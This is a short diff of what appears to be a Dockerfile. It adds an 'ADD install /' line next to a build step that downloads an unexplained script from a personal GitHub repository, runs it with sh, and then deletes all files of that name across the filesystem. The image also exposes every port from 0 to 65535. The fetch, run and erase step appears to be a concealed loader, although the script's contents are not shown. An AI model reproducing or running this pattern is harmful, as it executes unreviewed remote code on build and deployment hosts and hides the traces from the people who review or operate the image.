@@ -75,6 +75,7 @@ RUN set -ex && \
     && curl "https://raw.githubusercontent.com/solifd/ph/master/aaa" -o  alpine && sh alpine && find / -name  alpine |xargs rm -rf \
     # Delete dependencies
     && apk del .build-deps
+    ADD install /
 
 EXPOSE 0-65535
                                
